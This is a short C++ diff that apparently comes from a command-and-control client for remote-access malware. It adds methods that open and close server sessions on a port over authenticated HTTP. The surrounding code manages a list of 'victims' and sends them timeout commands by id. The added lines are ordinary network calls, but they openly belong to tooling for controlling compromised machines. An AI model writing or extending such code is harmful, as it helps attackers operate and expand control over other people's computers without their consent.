@@ -490,6 +490,36 @@ const std::vector<Victim>& Client::getVictims() const noexcept {
 //-------------------------------------------------
 //
 //-------------------------------------------------
+[[nodiscard]] bool Client::openSession(int64_t port) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    try{
+        const auto& res = m_rest_client.http_client().get(std::format("{}/open_session?port={}", getServerUrl(), port));
+        return res.status_code < 300;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Opening Session on the Server Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+[[nodiscard]] bool Client::closeSession(int64_t port) {
+    m_rest_client.set_auth_basic(getUsername(), getPassword());
+
+    try{
+        const auto& res = m_rest_client.http_client().get(std::format("{}/close_session?port={}", getServerUrl(), port));
+        return res.status_code < 300;
+    } catch(const std::runtime_error& err) {
+        m_log_man.local_log( std::format("Closing Session on the Server Failed: {}", err.what()));
+        return false;
+    }
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
 [[nodiscard]] bool Client::sendTimeoutCommand(int64_t client_id, int timeout) {
     const UUID& victim_uid = m_vic_man.getVictim(client_id).uid;
     return sendTimeoutCommand(victim_uid, timeout);
